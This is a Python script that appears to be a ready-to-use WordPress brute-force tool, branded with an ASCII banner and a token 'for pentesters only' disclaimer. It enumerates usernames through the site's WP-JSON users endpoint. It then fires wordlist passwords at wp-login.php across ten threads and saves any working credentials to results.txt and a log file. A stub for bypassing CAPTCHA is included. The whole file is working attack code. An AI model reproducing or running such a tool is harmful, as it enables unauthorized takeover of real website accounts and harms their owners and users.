import requests
import threading
import os
import logging
from concurrent.futures import ThreadPoolExecutor

# ------------ CONFIGURATION ----------
curl_timeout = 20
multithread_limit = 10
# -------------------------------------

red = '\033[91m'
gr = '\033[92m'
yel = '\033[93m'
clr = '\033[0m'

# Setup logging
logging.basicConfig(filename="bruteforce.log", level=logging.INFO, format="%(asctime)s - %(message)s")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def get_user_wp_json(target):
    try:
        response = requests.get(f"{target}/wp-json/wp/v2/users", timeout=curl_timeout)
        if response.status_code == 200:
            users = [user['slug'] for user in response.json()]
            if users:
                print(f"{gr}[+] Found usernames: {', '.join(users)}{clr}")
                return users
        print(f"{yel}[-] No usernames found via WP-JSON.{clr}")
    except Exception as e:
        print(f"{red}[-] Error fetching WP-JSON: {e}{clr}")
    return None

def bypass_captcha(session, target):
    # Implement CAPTCHA bypass if needed, e.g., using OCR or token retrieval
    print(f"{yel}[*] CAPTCHA bypass placeholder.{clr}")
    return session

def test_login(target, username, password):
    try:
        session = requests.Session()
        session = bypass_captcha(session, target)
        login_data = {'log': username, 'pwd': password, 'wp-submit': 'Log In'}
        response = session.post(f"{target}/wp-login.php", data=login_data, timeout=curl_timeout)
        if 'login_error' not in response.text:
            print(f"{gr}[+] Found valid credentials: {username}:{password}{clr}")
            logging.info(f"Valid credentials: {username}:{password}")
            with open("results.txt", "a") as f:
                f.write(f"{target} {username}:{password}\n")
        else:
            print(f"{yel}[-] Invalid: {username}:{password}{clr}")
    except Exception as e:
        print(f"{red}[-] Error testing {username}:{password} - {e}{clr}")

def main():
    try:
        clear_screen()
        print('''\033[93m
         _____   ______ ______   _____   ______ _______ _______ _______
|  |  | |     | |_____/ |     \ |_____] |_____/ |______ |______ |______
|__|__| |_____| |    \_ |_____/ |       |    \_ |______ ______| ______| \033[0m
                                                                        
                    \033[1;97mW O R D P R E S S   B R U T E F O R C E   T O O L           
          \033[94mXenpaiBot Is Number One Bot For Pentester \033[97m
          Author : \033[93mKanezama              
    ''')
        print("\033[94mThis is for Pentesters Only, Don't Try It For Illegal Things\033[0m")
        target = input("\033[32m[!] \033[1;93mYour Site Target: \033[0m").strip()
        if not target.startswith("http"):
            target = f"http://{target}"

        if 'wp-submit' not in requests.get(f"{target}/wp-login.php", timeout=curl_timeout).text:
            print(f"{red}[-] Invalid WordPress login page.{clr}")
            return

        base_dir = os.path.dirname(os.path.abspath(__file__))
        while True:
            wordlist_path = input("[!] Your Wordlist (e.g., pwd.txt): ").strip()
            wordlist_path = os.path.join(base_dir, wordlist_path)  # Ensure correct directory
            print(f"[DEBUG] Checking wordlist at: {wordlist_path}")

            if os.path.isfile(wordlist_path):
                print(f"\033[92m[+] Wordlist found at: {wordlist_path}\033[0m")
                break
            print(f"\033[91m[-] Wordlist file not found: {wordlist_path}\033[0m")

        with open(wordlist_path, "r") as f:
            passwords = [line.strip() for line in f.readlines()]

        usernames = get_user_wp_json(target)
        if not usernames:
            username = input("[!] Input Manual Username (or press Enter to exit): ").strip()
            if not username:
                print(f"{red}[-] Exiting...{clr}")
                return
            usernames = [username]

        print(f"{gr}[+] Starting brute-force attack...{clr}")
        logging.info("Starting brute-force attack...")

        with ThreadPoolExecutor(max_workers=multithread_limit) as executor:
            for username in usernames:
                for password in passwords:
                    executor.submit(test_login, target, username, password)
    
    except KeyboardInterrupt:
        print(f"\n{red}[-] Process interrupted. Exiting...{clr}")
        os._exit(0)
    except Exception as e:
        print(f"{red}[-] Unexpected error: {e}{clr}")

if __name__ == "__main__":
    main()
